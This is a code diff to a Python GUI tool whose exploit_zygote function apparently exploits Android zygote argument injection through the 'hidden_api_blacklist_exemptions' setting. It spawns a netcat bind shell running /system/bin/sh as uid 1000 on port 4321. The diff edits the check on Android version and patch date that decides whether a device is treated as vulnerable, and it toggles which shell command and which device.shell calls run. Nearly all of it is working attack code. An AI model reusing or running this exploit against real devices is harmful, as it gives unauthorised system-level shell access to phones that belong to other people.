@@ -1046,7 +1046,7 @@ class MyApp(ctk.CTk):
 
         # Exploiting attempt
         if incl_cve == "on":
-            if int(software.split(".")[0]) in range(9,16) and spl < "2024-06-01":
+            if int(software.split(".")[0]) in range(9,12) or int(software.split(".")[0]) in range(12,16) and spl < "2024-06-01":
                 self.change.set(0)
                 self.prog_text.configure(text="")
                 self.progress.pack_forget()
@@ -3364,8 +3364,8 @@ def exploit_zygote(zip_path, text, prog_text, change):
         return nc_command
 
     command = find_netcat()
-    #zygote_cmd = f"{command} -s 127.0.0.1 -p 4321 -L /system/bin/sh -l;"
-    zygote_cmd = f"(settings delete global hidden_api_blacklist_exemptions;{command} -s 127.0.0.1 -p 4321 -L /system/bin/sh)&"
+    zygote_cmd = f"{command} -s 127.0.0.1 -p 4321 -L /system/bin/sh -l;"
+    #zygote_cmd = f"(settings delete global hidden_api_blacklist_exemptions;{command} -s 127.0.0.1 -p 4321 -L /system/bin/sh)&"
     raw_zygote_arguments = [
             "--runtime-args",
             "--setuid=1000",
@@ -3477,10 +3477,11 @@ def exploit_zygote(zip_path, text, prog_text, change):
             "settings put global hidden_api_blacklist_exemptions \"" +
             payload + f"\n\"\nsettings delete global hidden_api_blacklist_exemptions\nsleep 2\n"
     )
-    device.shell("am force-stop com.android.settings")
+    #device.shell("am force-stop com.android.settings")
     try: device.shell(exploit_command, timeout=4)
     except: pass
-    device.shell("am start -a android.settings.SETTINGS")
+    #device.shell("am start -a android.settings.SETTINGS")
+    #device.shell("input keyevent KEYCODE_HOME")
     
     if "toybox" in command:
         whoami_cmd = "toybox whoami"
